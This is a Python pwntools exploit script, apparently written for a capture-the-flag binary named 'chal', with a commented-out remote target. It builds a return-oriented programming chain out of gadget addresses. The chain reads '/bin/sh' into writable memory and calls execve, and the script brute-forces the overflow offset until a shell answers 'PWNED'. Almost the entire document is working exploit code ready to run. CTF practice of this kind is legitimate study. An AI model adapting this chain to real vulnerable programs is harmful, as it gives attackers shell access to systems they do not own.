from pwn import *
import time

# ===========================================================
# CONFIGURATION
# ===========================================================
context.arch = 'amd64'
context.os = 'linux'
exe_path = './chal'

# --- ADDRESSES (Calculated from your logs) ---
# Base Delta verified from your output: 0x1001000
DELTA = 0x1001000

# Gadgets (Virtual Addresses)
POP_RDI = DELTA + 0x10134d  # 0x110234d
POP_RAX = DELTA + 0xb4cc4   # 0x10b5cc4
POP_RSI = DELTA + 0x10900f  # 0x110a00f
POP_RDX = DELTA + 0xbe9ec   # 0x10bf9ec
SYSCALL = DELTA + 0x1a365   # 0x101b365

# Writable memory (Data section)
WRITABLE_ADDR = 0x10d6e90

# ===========================================================
# BRUTE FORCE LOGIC
# ===========================================================
def test_offset(offset):
    # UNCOMMENT FOR REMOTE
    # io = remote('chal.amt.rs', 1337)
    io = process(exe_path, level='error') # 'error' hides crash logs

    # Build ROP Chain
    rop = b''
    
    # 1. read(0, WRITABLE_ADDR, 0x100)
    # Reads "/bin/sh" from stdin to memory
    rop += p64(POP_RDI) + p64(0)              # fd = 0
    rop += p64(POP_RSI) + p64(WRITABLE_ADDR)  # buf
    rop += p64(POP_RDX) + p64(0x100)          # count
    rop += p64(POP_RAX) + p64(0)              # syscall 0 (read)
    rop += p64(SYSCALL)

    # 2. execve(WRITABLE_ADDR, 0, 0)
    # Executes the string we just wrote
    rop += p64(POP_RDI) + p64(WRITABLE_ADDR)  # filename
    rop += p64(POP_RSI) + p64(0)              # argv
    rop += p64(POP_RDX) + p64(0)              # envp
    rop += p64(POP_RAX) + p64(59)             # syscall 59 (execve)
    rop += p64(SYSCALL)

    try:
        # Send ROP
        payload = flat({offset: rop})
        io.sendline(payload)
        
        # Give it a moment to reach the 'read' syscall
        time.sleep(0.1)
        
        # Send "/bin/sh"
        io.send(b'/bin/sh\x00')
        
        # Check if we have a shell by running a command
        time.sleep(0.1)
        io.sendline(b'echo PWNED')
        
        # If we see "PWNED", the shell is active!
        if b'PWNED' in io.recv(timeout=0.5):
            print(f"\n[+] SUCCESS! Found correct offset: {offset}")
            io.interactive()
            return True
    except EOFError:
        pass
    except Exception as e:
        pass

    io.close()
    return False

# ===========================================================
# MAIN LOOP
# ===========================================================
print(f"[*] Starting Brute-Force on ./chal")
print(f"[*] Addresses: RDI={hex(POP_RDI)}, Writable={hex(WRITABLE_ADDR)}")

# Zig offsets often vary by 8 bytes due to alignment/structs.
# We scan a range around 256-320.
possible_offsets = range(256, 320, 8)

for off in possible_offsets:
    print(f"[*] Trying offset {off}...")
    if test_offset(off):
        break
else:
    print("[-] Failed to pop shell. Double check the remote connection details or binary version.")
